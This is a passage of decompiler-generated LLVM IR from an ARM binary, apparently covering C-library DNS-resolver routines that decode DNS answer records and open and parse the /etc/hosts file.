  %v2_196e4 = inttoptr i32 %v1_196e4 to i32*
  %v3_196e4 = load i32, i32* %v2_196e4, align 4
  %v0_196e8 = load i32, i32* %r0.global-to-local, align 4
  %v1_196e8 = add i32 %v0_196e8, 4
  store i32 %v1_196e8, i32* %r0.global-to-local, align 4
  %v1_196ec = trunc i32 %v3_196e4 to i8
  %v2_196ec = load i32, i32* %r2.global-to-local, align 4
  %v3_196ec = add i32 %v2_196ec, 3
  %v4_196ec = inttoptr i32 %v3_196ec to i8*
  store i8 %v1_196ec, i8* %v4_196ec, align 1
  %v2_196f0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_196f0, i32* @r4, align 4
  store i32 %v6_19698, i32* @r5, align 4
  store i32 %v9_19698, i32* @r6, align 4
  ret i32 %v1_196e8

; uselistorder directives
  uselistorder i32 %v2_196ac, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v9_19698, { 1, 0, 2 }
  uselistorder i32 %v6_19698, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 4, 2, 5, 3, 0 }
}

define i32 @__length_question(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_196f8 = call i32 @__length_dotted()
  %v1_196fc = icmp slt i32 %v0_196f8, 0
  br i1 %v1_196fc, label %bb3, label %bb

bb:                                               ; preds = %entry
  %v4_19700 = add i32 %v0_196f8, 4
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  %v5_19704 = phi i32 [ %v0_196f8, %entry ], [ %v4_19700, %bb ]
  ret i32 %v5_19704

; uselistorder directives
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__decode_answer(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg4 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-288 = alloca i32, align 4
  %v3_19708 = load i32, i32* @r4, align 4
  %v6_19708 = load i32, i32* @r5, align 4
  %v9_19708 = load i32, i32* @r6, align 4
  %v12_19708 = load i32, i32* @r7, align 4
  %v21_19708 = load i32, i32* @sl, align 4
  %v2_1970c = ptrtoint i32* %stack_var_-288 to i32
  store i32 %arg3, i32* @r5, align 4
  store i32 %tmp, i32* @r6, align 4
  store i32 %v2_1970c, i32* @r2, align 4
  store i32 256, i32* @r3, align 4
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg1, i32* @sl, align 4
  %v0_19728 = call i32 @__decode_dotted()
  store i32 %v0_19728, i32* %r0.global-to-local, align 4
  store i32 %v0_19728, i32* @r7, align 4
  %v1_1972c = icmp slt i32 %v0_19728, 0
  %v0_19730 = load i32, i32* @r4, align 4
  %v2_19730 = add i32 %v0_19730, %v0_19728
  store i32 %v2_19730, i32* %r8.global-to-local, align 4
  br i1 %v1_1972c, label %bb14, label %dec_label_pc_19740

dec_label_pc_19740:                               ; preds = %entry
  %v1_19738 = load i32, i32* @r5, align 4
  %v2_19738 = sub i32 %v1_19738, %v2_19730
  %v1_19740 = add i32 %v2_19738, -10
  store i32 %v1_19740, i32* @r5, align 4
  %v6_19740 = icmp slt i32 %v1_19740, 0
  store i32 %v2_1970c, i32* %r0.global-to-local, align 4
  %v0_19748 = load i32, i32* @sl, align 4
  %v2_19748 = add i32 %v0_19748, %v2_19730
  store i32 %v2_19748, i32* @r4, align 4
  br i1 %v6_19740, label %bb, label %dec_label_pc_19754

bb:                                               ; preds = %dec_label_pc_19740
  br label %bb14

dec_label_pc_19754:                               ; preds = %dec_label_pc_19740
  %v1_19754 = bitcast i32* %stack_var_-288 to i8*
  %v2_19754 = call i32 @__GI_strdup(i8* %v1_19754)
  store i32 %v2_19754, i32* %r0.global-to-local, align 4
  %v1_19758 = load i32, i32* @r6, align 4
  %v2_19758 = inttoptr i32 %v1_19758 to i32*
  store i32 %v2_19754, i32* %v2_19758, align 4
  %v0_1975c = load i32, i32* @sl, align 4
  %v1_1975c = load i32, i32* %r8.global-to-local, align 4
  %v2_1975c = add i32 %v1_1975c, %v0_1975c
  %v3_1975c = inttoptr i32 %v2_1975c to i8*
  %v4_1975c = load i8, i8* %v3_1975c, align 1
  %v6_1975c = zext i8 %v4_1975c to i32
  %v0_19760 = load i32, i32* @r4, align 4
  %v1_19760 = add i32 %v0_19760, 1
  %v2_19760 = inttoptr i32 %v1_19760 to i8*
  %v3_19760 = load i8, i8* %v2_19760, align 1
  %v4_19760 = zext i8 %v3_19760 to i32
  %v4_19764 = mul nuw nsw i32 %v6_1975c, 256
  %v5_19764 = or i32 %v4_19760, %v4_19764
  store i32 %v5_19764, i32* %r3.global-to-local, align 4
  %v1_19768 = load i32, i32* @r6, align 4
  %v2_19768 = add i32 %v1_19768, 4
  %v3_19768 = inttoptr i32 %v2_19768 to i32*
  store i32 %v5_19764, i32* %v3_19768, align 4
  %v0_1976c = load i32, i32* @r4, align 4
  %v1_1976c = add i32 %v0_1976c, 2
  store i32 %v1_1976c, i32* %r1.global-to-local, align 4
  %v2_19770 = inttoptr i32 %v1_1976c to i8*
  %v3_19770 = load i8, i8* %v2_19770, align 1
  %v4_19770 = zext i8 %v3_19770 to i32
  %v1_19774 = add i32 %v0_1976c, 3
  %v2_19774 = inttoptr i32 %v1_19774 to i8*
  %v3_19774 = load i8, i8* %v2_19774, align 1
  %v4_19774 = zext i8 %v3_19774 to i32
  %v4_19778 = mul nuw nsw i32 %v4_19770, 256
  %v5_19778 = or i32 %v4_19774, %v4_19778
  store i32 %v5_19778, i32* %r3.global-to-local, align 4
  %v1_1977c = load i32, i32* @r6, align 4
  %v2_1977c = add i32 %v1_1977c, 8
  %v3_1977c = inttoptr i32 %v2_1977c to i32*
  store i32 %v5_19778, i32* %v3_1977c, align 4
  %v0_19780 = load i32, i32* %r1.global-to-local, align 4
  %v1_19780 = add i32 %v0_19780, 2
  %v1_19784 = add i32 %v0_19780, 3
  %v2_19784 = inttoptr i32 %v1_19784 to i8*
  %v3_19784 = load i8, i8* %v2_19784, align 1
  %v4_19784 = zext i8 %v3_19784 to i32
  store i32 %v4_19784, i32* %r3.global-to-local, align 4
  %v2_19788 = inttoptr i32 %v1_19780 to i8*
  %v3_19788 = load i8, i8* %v2_19788, align 1
  %v4_19788 = zext i8 %v3_19788 to i32
  store i32 %v4_19788, i32* %r0.global-to-local, align 4
  %v1_1978c = add i32 %v0_19780, 5
  %v2_1978c = inttoptr i32 %v1_1978c to i8*
  %v3_1978c = load i8, i8* %v2_1978c, align 1
  %v4_1978c = zext i8 %v3_1978c to i32
  %v3_19790 = mul nuw nsw i32 %v4_19784, 65536
  store i32 %v3_19790, i32* %r3.global-to-local, align 4
  %v1_19794 = add i32 %v0_19780, 4
  %v2_19794 = inttoptr i32 %v1_19794 to i8*
  %v3_19794 = load i8, i8* %v2_19794, align 1
  %v4_19794 = zext i8 %v3_19794 to i32
  %v4_19798 = mul nuw i32 %v4_19788, 16777216
  %v5_19798 = or i32 %v4_19798, %v3_19790
  %v2_1979c = or i32 %v5_19798, %v4_1978c
  %v4_197a0 = mul nuw nsw i32 %v4_19794, 256
  %v5_197a0 = or i32 %v2_1979c, %v4_197a0
  store i32 %v5_197a0, i32* %r3.global-to-local, align 4
  %v1_197a4 = load i32, i32* @r6, align 4
  %v2_197a4 = add i32 %v1_197a4, 12
  %v3_197a4 = inttoptr i32 %v2_197a4 to i32*
  store i32 %v5_197a0, i32* %v3_197a4, align 4
  %v0_197a8 = load i32, i32* %r1.global-to-local, align 4
  %v1_197a8 = add i32 %v0_197a8, 6
  %v2_197a8 = inttoptr i32 %v1_197a8 to i8*
  %v3_197a8 = load i8, i8* %v2_197a8, align 1
  %v4_197a8 = zext i8 %v3_197a8 to i32
  %v0_197ac = load i32, i32* @r4, align 4
  %v1_197ac = add i32 %v0_197ac, 9
  %v2_197ac = inttoptr i32 %v1_197ac to i8*
  %v3_197ac = load i8, i8* %v2_197ac, align 1
  %v4_197ac = zext i8 %v3_197ac to i32
  %v1_197b0 = add i32 %v0_197ac, 10
  store i32 %v1_197b0, i32* %r0.global-to-local, align 4
  %v4_197b4 = mul nuw nsw i32 %v4_197a8, 256
  %v5_197b4 = or i32 %v4_197ac, %v4_197b4
  store i32 %v5_197b4, i32* %r3.global-to-local, align 4
  %v0_197b8 = load i32, i32* %r8.global-to-local, align 4
  %v1_197b8 = add i32 %v0_197b8, 10
  %v0_197bc = load i32, i32* @r5, align 4
  %v1_197c0 = add nuw nsw i32 %v5_197b4, 10
  store i32 %v1_197c0, i32* %r1.global-to-local, align 4
  %v1_197c4 = load i32, i32* @r6, align 4
  %v2_197c4 = add i32 %v1_197c4, 24
  %v3_197c4 = inttoptr i32 %v2_197c4 to i32*
  store i32 %v1_197b8, i32* %v3_197c4, align 4
  %v0_197c8 = load i32, i32* %r0.global-to-local, align 4
  %v1_197c8 = load i32, i32* @r6, align 4
  %v2_197c8 = add i32 %v1_197c8, 20
  %v3_197c8 = inttoptr i32 %v2_197c8 to i32*
  store i32 %v0_197c8, i32* %v3_197c8, align 4
  %v0_197cc = load i32, i32* %r3.global-to-local, align 4
  %v1_197cc = load i32, i32* @r6, align 4
  %v2_197cc = add i32 %v1_197cc, 16
  %v3_197cc = inttoptr i32 %v2_197cc to i32*
  store i32 %v0_197cc, i32* %v3_197cc, align 4
  %v0_197d0 = load i32, i32* @r7, align 4
  %v1_197d0 = load i32, i32* %r1.global-to-local, align 4
  %v2_197d0 = add i32 %v1_197d0, %v0_197d0
  %v5_197d4 = icmp slt i32 %v0_197bc, %v5_197b4
  %.v2_197d0 = select i1 %v5_197d4, i32 -1, i32 %v2_197d0
  br label %bb14

bb14:                                             ; preds = %bb, %dec_label_pc_19754, %entry
  %v0_197d8 = phi i32 [ %.v2_197d0, %dec_label_pc_19754 ], [ %v1_19740, %bb ], [ %v0_19728, %entry ]
  store i32 %v0_197d8, i32* %r0.global-to-local, align 4
  store i32 %v3_19708, i32* @r4, align 4
  store i32 %v6_19708, i32* @r5, align 4
  store i32 %v9_19708, i32* @r6, align 4
  store i32 %v12_19708, i32* @r7, align 4
  store i32 %v21_19708, i32* @sl, align 4
  ret i32 %v0_197d8

; uselistorder directives
  uselistorder i32 %v0_197d8, { 1, 0 }
  uselistorder i32 %v5_197b4, { 1, 0, 2 }
  uselistorder i32 %v3_19790, { 1, 0 }
  uselistorder i32 %v1_19740, { 0, 2, 1 }
  uselistorder i32 %v0_19728, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32 24, { 27, 28, 29, 19, 36, 0, 30, 31, 32, 20, 10, 37, 11, 1, 33, 21, 22, 23, 24, 25, 26, 12, 34, 35, 13, 14, 15, 16, 17, 18, 7, 8, 4, 3, 9, 2, 5, 6, 38, 39 }
  uselistorder i32 9, { 16, 17, 18, 19, 20, 4, 21, 5, 9, 3, 10, 25, 6, 11, 12, 13, 14, 15, 7, 8, 2, 1, 0, 22, 23, 24 }
  uselistorder i32 5, { 1, 21, 22, 23, 12, 6, 2, 13, 14, 7, 15, 3, 5, 0, 16, 17, 8, 18, 19, 20, 9, 11, 10, 4, 24, 25, 26 }
  uselistorder i32 -10, { 3, 1, 2, 0 }
  uselistorder label %bb14, { 1, 0, 2 }
}

define i32 @__open_etc_hosts() local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_24eac.1321 to i32), i32* @r1, align 4
  %v0_197e8 = load i32, i32* @lr, align 4
  store i32 %v0_197e8, i32* %stack_var_-4, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_24f10.1355 to i32), i32* @r0, align 4
  %v3_197f0 = call i32 @__GI_fopen(i32 ptrtoint ([11 x i8]* @global_var_24f10.1355 to i32), i32 ptrtoint (i32* @global_var_24eac.1321 to i32))
  %v2_197f4 = icmp eq i32 %v3_197f0, 0
  store i32 ptrtoint (i32* @global_var_24eac.1321 to i32), i32* @r1, align 4
  br i1 %v2_197f4, label %bb2, label %bb

bb:                                               ; preds = %entry
  ret i32 %v3_197f0

bb2:                                              ; preds = %entry
  store i32 ptrtoint ([18 x i8]* @global_var_24f1c.1357 to i32), i32* @r0, align 4
  %v2_19804 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_19804, i32* @lr, align 4
  %v3_19808 = call i32 @__GI_fopen(i32 ptrtoint ([18 x i8]* @global_var_24f1c.1357 to i32), i32 ptrtoint (i32* @global_var_24eac.1321 to i32))
  ret i32 %v3_19808

; uselistorder directives
  uselistorder i32 (i32, i32)* @__GI_fopen, { 6, 2, 1, 0, 5, 4, 3 }
  uselistorder i32 114, { 2, 0, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_24eac.1321 to i32), { 1, 4, 0, 5, 2, 6, 3, 7 }
}

define i32 @__read_etc_hosts_r() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp53 = call i32 @__decompiler_undefined_function_0()
  %tmp56 = call i32 @__decompiler_undefined_function_0()
  %tmp57 = call i32 @__decompiler_undefined_function_0()
  %tmp61 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-64 = alloca i32, align 4
  %v3_19818 = load i32, i32* @r4, align 4
  %v6_19818 = load i32, i32* @r5, align 4
  %v12_19818 = load i32, i32* @r7, align 4
  %v15_19818 = load i32, i32* @r8, align 4
  %v21_19818 = load i32, i32* @sl, align 4
  %v24_19818 = load i32, i32* @fp, align 4
  store i32 %tmp61, i32* @r4, align 4
  %v1_19824 = sub i32 0, %tmp61
  %v1_19828 = urem i32 %v1_19824, 4
  store i32 %v1_19828, i32* %ip.global-to-local, align 4
  %v2_19828 = icmp eq i32 %v1_19828, 0
  %v0_1982c = load i32, i32* @r2, align 4
  %v0_19830 = load i32, i32* @r0, align 4
  %v0_19834 = load i32, i32* @r1, align 4
  %v0_19838 = load i32, i32* @r3, align 4
  store i32 %v0_19838, i32* %stack_var_-64, align 4
  store i32 %tmp57, i32* %r2.global-to-local, align 4
  br i1 %v2_19828, label %dec_label_pc_19858, label %dec_label_pc_19848

dec_label_pc_19848:                               ; preds = %entry
  %v2_19848 = sub i32 %tmp57, %v1_19828
  %v3_19848 = icmp ult i32 %tmp57, %v1_19828
  br i1 %v3_19848, label %dec_label_pc_19b2c, label %dec_label_pc_19850

dec_label_pc_19850:                               ; preds = %dec_label_pc_19848
  store i32 %v2_19848, i32* %r2.global-to-local, align 4
  %v2_19854 = add i32 %v1_19828, %tmp61
  store i32 %v2_19854, i32* @r4, align 4
  br label %dec_label_pc_19858

dec_label_pc_19858:                               ; preds = %entry, %dec_label_pc_19850
  %v0_19868 = phi i32 [ %tmp61, %entry ], [ %v2_19854, %dec_label_pc_19850 ]
  %v0_1986c = phi i32 [ %tmp57, %entry ], [ %v2_19848, %dec_label_pc_19850 ]
  %tmp = icmp ult i32 %v0_1986c, 32
  br i1 %tmp, label %dec_label_pc_19b2c, label %dec_label_pc_19860

dec_label_pc_19860:                               ; preds = %dec_label_pc_19858
  store i32 %v0_19838, i32* %r0.global-to-local, align 4
  %v7_19864 = icmp eq i32 %v0_19838, 1
  %v1_19868 = add i32 %v0_19868, 32
  store i32 %v1_19868, i32* @fp, align 4
  %v1_1986c = add i32 %v0_1986c, -32
  store i32 %v1_1986c, i32* @r8, align 4
  br i1 %v7_19864, label %dec_label_pc_19998, label %dec_label_pc_19874

dec_label_pc_19874:                               ; preds = %dec_label_pc_19860
  store i32 %tmp56, i32* %r1.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v2_19880 = inttoptr i32 %tmp56 to i32*
  store i32 -1, i32* %v2_19880, align 4
  %tmp80 = icmp ult i32 %v1_1986c, 4
  br i1 %tmp80, label %dec_label_pc_19b2c, label %dec_label_pc_19888

dec_label_pc_19888:                               ; preds = %dec_label_pc_19874
  %v0_19888 = load i32, i32* %r2.global-to-local, align 4
  %v1_19888 = add i32 %v0_19888, -36
  store i32 %v1_19888, i32* %r3.global-to-local, align 4
  %tmp81 = icmp ult i32 %v1_19888, 8
  br i1 %tmp81, label %dec_label_pc_19b2c, label %dec_label_pc_19894

dec_label_pc_19894:                               ; preds = %dec_label_pc_19888
  %v0_19894 = load i32, i32* @r8, align 4
  %tmp82 = icmp ult i32 %v0_19894, 16
  br i1 %tmp82, label %dec_label_pc_19b2c, label %dec_label_pc_1989c

dec_label_pc_1989c:                               ; preds = %dec_label_pc_19894
  %v1_1989c = add i32 %v0_19888, -48
  store i32 %v1_1989c, i32* %r3.global-to-local, align 4
  %tmp83 = icmp ult i32 %v1_1989c, 8
  br i1 %tmp83, label %dec_label_pc_19b2c, label %dec_label_pc_198a8

dec_label_pc_198a8:                               ; preds = %dec_label_pc_1989c
  %v1_198a8 = add i32 %v0_19888, -44
  store i32 %v1_198a8, i32* @r8, align 4
  %v1_198ac = add i32 %v0_19888, -56
  store i32 %v1_198ac, i32* %r3.global-to-local, align 4
  %v3_198b0 = icmp ult i32 %v1_198ac, %v1_198a8
  br i1 %v3_198b0, label %.thread1, label %bb

bb:                                               ; preds = %dec_label_pc_198a8
  %v1_198b8 = load i32, i32* @r4, align 4
  %v2_198b8 = add i32 %v1_198b8, 44
  br label %bb74

.thread1:                                         ; preds = %dec_label_pc_198a8
  store i32 %v1_198ac, i32* @r8, align 4
  %v1_198bc.pre = load i32, i32* @r4, align 4
  %v2_198bc = add i32 %v1_198bc.pre, 56
  br label %bb74

bb74:                                             ; preds = %bb, %.thread1
  %storemerge = phi i32 [ %v2_198bc, %.thread1 ], [ %v2_198b8, %bb ]
  %v0_198c4 = phi i32 [ %v1_198bc.pre, %.thread1 ], [ %v1_198b8, %bb ]
  %v0_198c0 = phi i32 [ %v1_198ac, %.thread1 ], [ %v1_198a8, %bb ]
  store i32 %storemerge, i32* @r5, align 4
  %v1_198c4 = add i32 %v0_198c4, 36
  store i32 %v1_198c4, i32* @r6, align 4
  %v1_198c8 = add i32 %v0_198c4, 48
  store i32 %v1_198c8, i32* %sl.global-to-local, align 4
  %tmp84 = icmp ult i32 %v0_198c0, 80
  br i1 %tmp84, label %dec_label_pc_19b2c, label %dec_label_pc_198d0

dec_label_pc_198d0:                               ; preds = %bb74
  %v0_198d0 = call i32 @__open_etc_hosts()
  store i32 %v0_198d0, i32* %r0.global-to-local, align 4
  %v2_198d4 = icmp eq i32 %v0_198d0, 0
  br i1 %v2_198d4, label %dec_label_pc_198f0, label %.thread

.thread:                                          ; preds = %dec_label_pc_198d0
  %v1_198dc = load i32, i32* @fp, align 4
  store i32 %v1_198dc, i32* @r7, align 4
  %v1_198e0 = load i32, i32* @r5, align 4
  store i32 %v1_198e0, i32* @fp, align 4
  %v1_198e4 = load i32, i32* @r6, align 4
  %v1_198e8 = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_199a4

dec_label_pc_198f0:                               ; preds = %dec_label_pc_198d0
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %tmp53, i32* %r2.global-to-local, align 4
  %v2_198f8 = inttoptr i32 %tmp53 to i32*
  store i32 0, i32* %v2_198f8, align 4
  %v0_198fc = call i32 @__errno_location()
  store i32 %v0_198fc, i32* %r0.global-to-local, align 4
  %v1_19900 = inttoptr i32 %v0_198fc to i32*
  %v2_19900 = load i32, i32* %v1_19900, align 4
  store i32 %v2_19900, i32* @sl, align 4
  br label %dec_label_pc_19b30

dec_label_pc_19908:                               ; preds = %dec_label_pc_19ab8
  %v0_19908 = load i32, i32* @r4, align 4
  %v1_19908 = add i32 %v0_19908, 4
  %v2_19908 = inttoptr i32 %v1_19908 to i32*
  %v3_19908 = load i32, i32* %v2_19908, align 4
  %v1_1990c = load i32, i32* @sb, align 4
  %v2_1990c = inttoptr i32 %v1_1990c to i32*
  store i32 %v3_19908, i32* %v2_1990c, align 4
  store i32 %stack_var_-48.1, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %tmp53, i32* %ip.global-to-local, align 4
  %v0_19920 = load i32, i32* @r4, align 4
  %v1_19920 = add i32 %v0_19920, 8
  store i32 %v1_19920, i32* %r1.global-to-local, align 4
  %v1_19924 = load i32, i32* @sb, align 4
  %v2_19924 = add i32 %v1_19924, 8
  %v3_19924 = inttoptr i32 %v2_19924 to i32*
  store i32 2, i32* %v3_19924, align 4
  %v0_19928 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_19928, i32* @sl, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v0_19930 = load i32, i32* @sb, align 4
  %v1_19930 = load i32, i32* %ip.global-to-local, align 4
  %v2_19930 = inttoptr i32 %v1_19930 to i32*
  store i32 %v0_19930, i32* %v2_19930, align 4
  %v0_19934 = load i32, i32* @r7, align 4
  %v1_19934 = load i32, i32* %r0.global-to-local, align 4
  %v2_19934 = inttoptr i32 %v1_19934 to i32*
  store i32 %v0_19934, i32* %v2_19934, align 4
  %v0_19938 = load i32, i32* %r3.global-to-local, align 4
  %v1_19938 = load i32, i32* @sb, align 4
  %v2_19938 = add i32 %v1_19938, 12
  %v3_19938 = inttoptr i32 %v2_19938 to i32*
  store i32 %v0_19938, i32* %v3_19938, align 4
  %v0_1993c = load i32, i32* %r0.global-to-local, align 4
  %v1_1993c = load i32, i32* @sb, align 4
  %v2_1993c = add i32 %v1_1993c, 16
  %v3_1993c = inttoptr i32 %v2_1993c to i32*
  store i32 %v0_1993c, i32* %v3_1993c, align 4
  %v0_19940 = load i32, i32* %r1.global-to-local, align 4
  %v1_19940 = load i32, i32* @sb, align 4
  %v2_19940 = add i32 %v1_19940, 4
  %v3_19940 = inttoptr i32 %v2_19940 to i32*
  store i32 %v0_19940, i32* %v3_19940, align 4
  %v0_19944 = load i32, i32* %r2.global-to-local, align 4
  %v1_19944 = load i32, i32* %r0.global-to-local, align 4
  %v2_19944 = add i32 %v1_19944, 4
  %v3_19944 = inttoptr i32 %v2_19944 to i32*
  store i32 %v0_19944, i32* %v3_19944, align 4
  br label %dec_label_pc_19b14

dec_label_pc_1994c:                               ; preds = %dec_label_pc_19ae0
  store i32 %tmp53, i32* %ip.global-to-local, align 4
  %v0_19950 = load i32, i32* @r4, align 4
  %v1_19950 = add i32 %v0_19950, 4
  %v2_19950 = inttoptr i32 %v1_19950 to i32*
  %v3_19950 = load i32, i32* %v2_19950, align 4
  store i32 %v3_19950, i32* %r3.global-to-local, align 4
  store i32 %stack_var_-40.1, i32* %r0.global-to-local, align 4
  %v0_19958 = load i32, i32* @sb, align 4
  %v2_19958 = inttoptr i32 %tmp53 to i32*
  store i32 %v0_19958, i32* %v2_19958, align 4
  store i32 %v0_199b0, i32* %ip.global-to-local, align 4
  %v0_19960 = load i32, i32* %r3.global-to-local, align 4
  %v1_19960 = load i32, i32* @sb, align 4
  %v2_19960 = inttoptr i32 %v1_19960 to i32*
  store i32 %v0_19960, i32* %v2_19960, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_1996c = load i32, i32* %ip.global-to-local, align 4
  %v1_1996c = load i32, i32* %r0.global-to-local, align 4
  %v2_1996c = inttoptr i32 %v1_1996c to i32*
  store i32 %v0_1996c, i32* %v2_1996c, align 4
  %v0_19970 = load i32, i32* %r3.global-to-local, align 4
  %v1_19970 = load i32, i32* @sb, align 4
  %v2_19970 = add i32 %v1_19970, 12
  %v3_19970 = inttoptr i32 %v2_19970 to i32*
  store i32 %v0_19970, i32* %v3_19970, align 4
  store i32 10, i32* %r0.global-to-local, align 4
  store i32 %stack_var_-40.1, i32* %r3.global-to-local, align 4
  %v0_1997c = load i32, i32* @r4, align 4
  %v1_1997c = add i32 %v0_1997c, 8
  store i32 %v1_1997c, i32* %r1.global-to-local, align 4
  %v0_19980 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_19980, i32* @sl, align 4
  %v1_19984 = load i32, i32* @sb, align 4
  %v2_19984 = add i32 %v1_19984, 8
  %v3_19984 = inttoptr i32 %v2_19984 to i32*
  store i32 10, i32* %v3_19984, align 4
  %v0_19988 = load i32, i32* %r3.global-to-local, align 4
  %v1_19988 = load i32, i32* @sb, align 4
  %v2_19988 = add i32 %v1_19988, 16
  %v3_19988 = inttoptr i32 %v2_19988 to i32*
  store i32 %v0_19988, i32* %v3_19988, align 4
  %v0_1998c = load i32, i32* %r1.global-to-local, align 4
  %v1_1998c = load i32, i32* @sb, align 4
  %v2_1998c = add i32 %v1_1998c, 4
  %v3_1998c = inttoptr i32 %v2_1998c to i32*
  store i32 %v0_1998c, i32* %v3_1998c, align 4
  %v0_19990 = load i32, i32* %r2.global-to-local, align 4
  %v1_19990 = load i32, i32* %r3.global-to-local, align 4
  %v2_19990 = add i32 %v1_19990, 4
  %v3_19990 = inttoptr i32 %v2_19990 to i32*
  store i32 %v0_19990, i32* %v3_19990, align 4
  br label %dec_label_pc_19b14

dec_label_pc_19998:                               ; preds = %dec_label_pc_19860
  store i32 0, i32* @r7, align 4
  %.pre = inttoptr i32 %tmp56 to i32*
  br label %dec_label_pc_199a4

dec_label_pc_199a4:                               ; preds = %.thread, %dec_label_pc_19998
  %v2_199b4.pre-phi = phi i32* [ %v2_19880, %.thread ], [ %.pre, %dec_label_pc_19998 ]
  %v0_199b0 = phi i32 [ %v1_198dc, %.thread ], [ 0, %dec_label_pc_19998 ]
  %stack_var_-40.1 = phi i32 [ %v1_198e8, %.thread ], [ 0, %dec_label_pc_19998 ]
  %stack_var_-48.1 = phi i32 [ %v1_198e4, %.thread ], [ 0, %dec_label_pc_19998 ]
  %stack_var_-52.0 = phi i32 [ %v0_198d0, %.thread ], [ %v0_19830, %dec_label_pc_19998 ]
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 %tmp56, i32* %ip.global-to-local, align 4
  store i32 1, i32* @sl, align 4
  store i32 1, i32* %v2_199b4.pre-phi, align 4
  %v2_19a78 = inttoptr i32 %v0_19834 to i8*
  %v7_19ab0 = icmp eq i32 %v0_1982c, 2
  %v7_19ad8 = icmp eq i32 %v0_1982c, 10
  br label %dec_label_pc_19afc

dec_label_pc_199bc:                               ; preds = %dec_label_pc_19afc
  %v0_199bc = load i32, i32* @fp, align 4
  store i32 %v0_199bc, i32* %r0.global-to-local, align 4
  store i32 35, i32* %r1.global-to-local, align 4
  %v2_199c4 = call i32 @__GI_strchr(i32 %v0_199bc, i32 35)
  store i32 %v2_199c4, i32* %r0.global-to-local, align 4
  %v3_199c8 = icmp eq i32 %v2_199c4, 0
  br i1 %v3_199c8, label %.thread10, label %bb75

.thread10:                                        ; preds = %dec_label_pc_199bc
  %v0_199d011 = load i32, i32* @fp, align 4
  store i32 %v0_199d011, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r6, align 4
  br label %dec_label_pc_19a3c.preheader

bb75:                                             ; preds = %dec_label_pc_199bc
  %v3_199c4 = inttoptr i32 %v2_199c4 to i8*
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_199d0 = load i32, i32* @fp, align 4
  store i32 %v0_199d0, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r6, align 4
  store i8 0, i8* %v3_199c4, align 1
  %v0_19a3c30.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_19a3c.preheader

dec_label_pc_19a3c.preheader:                     ; preds = %bb75, %.thread10
  %v0_19a3c30 = phi i32 [ %v0_19a3c30.pre, %bb75 ], [ %v0_199d011, %.thread10 ]
  %v1_19a3c31 = inttoptr i32 %v0_19a3c30 to i8*
  %v2_19a3c32 = load i8, i8* %v1_19a3c31, align 1
  %v3_19a3c33 = zext i8 %v2_19a3c32 to i32
  store i32 %v3_19a3c33, i32* %r3.global-to-local, align 4
  %v2_19a4034 = icmp eq i8 %v2_19a3c32, 0
  br i1 %v2_19a4034, label %dec_label_pc_19a48, label %dec_label_pc_199e8.preheader

dec_label_pc_199e0:                               ; preds = %dec_label_pc_199f4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_199e4 = inttoptr i32 %v8_19a0c to i8*
  store i8 0, i8* %v3_199e4, align 1
  %v4_199e4 = load i32, i32* %r2.global-to-local, align 4
  %v5_199e4 = add i32 %v4_199e4, 1
  store i32 %v5_199e4, i32* %r2.global-to-local, align 4
  %v1_199e8 = inttoptr i32 %v5_199e4 to i8*
  %v2_199e8 = load i8, i8* %v1_199e8, align 1
  %v3_199e8 = zext i8 %v2_199e8 to i32
  store i32 %v3_199e8, i32* %r1.global-to-local, align 4
  %v2_199ec = icmp eq i8 %v2_199e8, 0
  br i1 %v2_199ec, label %dec_label_pc_19a48, label %dec_label_pc_199f4

dec_label_pc_199f4:                               ; preds = %dec_label_pc_199e8.preheader, %dec_label_pc_199e0
  %v8_19a0c = phi i32 [ %v5_199e4, %dec_label_pc_199e0 ], [ %v0_199e820, %dec_label_pc_199e8.preheader ]
  %v1_199fc = phi i32 [ %v3_199e8, %dec_label_pc_199e0 ], [ %v3_199e823, %dec_label_pc_199e8.preheader ]
  %v2_199f8 = load i32, i32* @global_var_2d288, align 4
  store i32 %v2_199f8, i32* %r3.global-to-local, align 4
  %v3_199fc = mul nuw nsw i32 %v1_199fc, 2
  %v4_199fc = add i32 %v3_199fc, %v2_199f8
